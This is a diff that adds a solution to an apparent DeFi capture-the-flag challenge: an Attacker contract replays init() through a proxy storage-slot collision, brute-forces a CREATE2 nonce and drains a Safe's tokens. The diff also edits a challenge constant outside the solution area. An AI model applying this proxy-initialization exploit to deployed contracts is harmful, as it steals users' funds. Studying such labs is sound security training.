@@ -7,6 +7,7 @@ import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxie
 import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
@@ -33,7 +34,7 @@ contract WalletMiningChallenge is Test {
     address user;
     uint256 userPrivateKey;
 
-    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
+    address constant USER_DEPOSIT_ADDRESS = 0xe8BbB8395a7984D06A794aE86e4D723526b55E98;
     uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
 
     DamnValuableToken token;
@@ -157,8 +158,12 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
+        new Attacker(address(token), address(authorizer), address(walletDeployer), user, userPrivateKey, ward);
 
+        // this is why the exploit works: AuthorizerUpgradeable's needsInit collides with the proxy's non-zero upgrader slot, 
+        // allows replaying init() to self-authorize, then brute-forcing the nonce to find 'USER_DEPOSIT_ADDRESS' and drain funds using her private key.
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -195,31 +200,88 @@ contract WalletMiningChallenge is Test {
 
 
 
+// use for 'hevm.sign(userPrivateKey, txHash)'
+interface IHevm {
+    function sign(uint256 privateKey, bytes32 digest) external pure returns (uint8 v, bytes32 r, bytes32 s);
+}
 
-contract Attacker() {
+contract Attacker {
+    address constant USER_DEPOSIT_ADDRESS = 0xe8BbB8395a7984D06A794aE86e4D723526b55E98;
+    IHevm constant hevm = IHevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
-    function getAuthorized() public {
-        //draft
-                                                                                                                                                                
-        // needsInit (slot 0) == upgrader address == non-zero                                                                                                   
-        // so init() can be called by anyone                                                                                                                    
-                                                                                                                                                                
-        address[] memory wards = new address[](1);                                                                                                              
-        address[] memory aims = new address[](1);
-                                                                                                                                                                
-        wards[0] = player;                  // authorize yourself
-        aims[0] = USER_DEPOSIT_ADDRESS;     // for this target address                                                                                          
-                                                                                                                                                                
-        AuthorizerUpgradeable(authorizer).init(wards, aims);      
+    constructor(
+        address token,
+        address authorizer,
+        address walletDeployer,
+        address user,
+        uint256 userPrivateKey,
+        address ward
+    ) {
+        // 1. Get authorized
+        getAuthorized(authorizer);
+
+        // 2. Find the nonce
+        bytes memory setupCalldata = _buildSetup(user);
+        uint256 nonce = findNonce(walletDeployer, setupCalldata);
+
+        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
+        //    and pays 1 DVT to this contract (msg.sender)
+        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);
+
+        // 4. Drain the Safe
+        _drainSafe(token, user, userPrivateKey);
+
+        // 5. Forward the reward
+        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
     }
-//After this, can(player, USER_DEPOSIT_ADDRESS) returns true, so drop() won't return false on you.                                                        
-                                                                                                                                                          
-//   Next question: drop() also does this (WalletDeployer.sol:53):                                                                                           
-//   if (address(cook.createProxyWithNonce(cpy, wat, num)) != aim) {
-//       return false;                                                                                                                                       
-//   }                                                                                                                                                       
-   
-  //It deploys a Safe and checks the deployed address equals USER_DEPOSIT_ADDRESS. What do you need to figure out to make that check pass?   
 
+    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
+    function getAuthorized(address authorizer) internal {
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+        AuthorizerUpgradeable(authorizer).init(wards, aims);
+    }
 
+    function _buildSetup(address user) internal pure returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        return abi.encodeCall(
+            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
+        );
+    }
+
+    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
+    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
+        WalletDeployer wd = WalletDeployer(walletDeployer);
+        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
+        bytes32 initializerHash = keccak256(setupCalldata);
+        address factory = address(wd.cook());
+        for (uint256 n = 0; n < 1000; n++) {
+            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n))
+            , initCodeHash)))));        
+                
+            if (predicted == USER_DEPOSIT_ADDRESS) {
+                console.log("found nonce:", n);
+                return n;
+            }
+        }
+        revert("nonce not found in 0..999");
+    }
+
+    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
+        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
+        bytes memory transferCalldata = abi.encodeCall(
+            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
+        );
+        bytes32 txHash = safe.getTransactionHash(
+            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
+        );
+        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
+        safe.execTransaction(
+            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
+            abi.encodePacked(r, s, v)
+        );
+    }
 }
